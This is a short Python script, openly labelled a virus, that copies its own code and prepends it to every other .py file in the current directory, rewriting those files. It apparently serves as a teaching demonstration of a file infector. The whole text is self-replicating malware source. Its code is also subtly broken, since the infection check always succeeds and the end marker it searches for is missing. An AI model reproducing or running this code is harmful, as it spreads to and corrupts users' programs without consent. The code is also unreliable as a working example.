#### VIRUS BEGIN ####

import sys, glob, re

#### GET A COPY OF THE VIRUS ####
vCode = []
fh = open(sys.argv[0], "r")
lines = fh.readlines()
fh.close()

inVirus = False

for line in lines:
    if (re.search('^#### VIRUS BEGIN ####', line)):
        inVirus = True

    if (inVirus):
        vCode.append(line)
    
    if (re.search('^#### VIRUS END ####', line)):
        break


#### FIND POTENTIAL VICTIMS (PROGRAMS) ####
progs = glob.glob("*.py")


#### CHECK AND INFECT ####
for prog in progs:
    fh = open(prog, "r")
    pCode = fh.readlines()
    fh.close()

    infected = False

    for line in pCode:
        if ('#### VIRUS BEGIN ####'):
            infected = True
            break

    if not infected:
        newCode = []
        if ('#!' in pCode[0]):
            newCode. append(pCode.pop(0))
        newCode.extend(vCode)
        newCode.extend(pCode)

        fh = open(prog, 'w')
        fh.writelines(newCode)
        fh.close()

#### OPTIONAL PAYLOAD: EXECUTE VIRUS ####

print("Infected")

print("Hello, World")


# now each time hello.py runs, it runs the virus code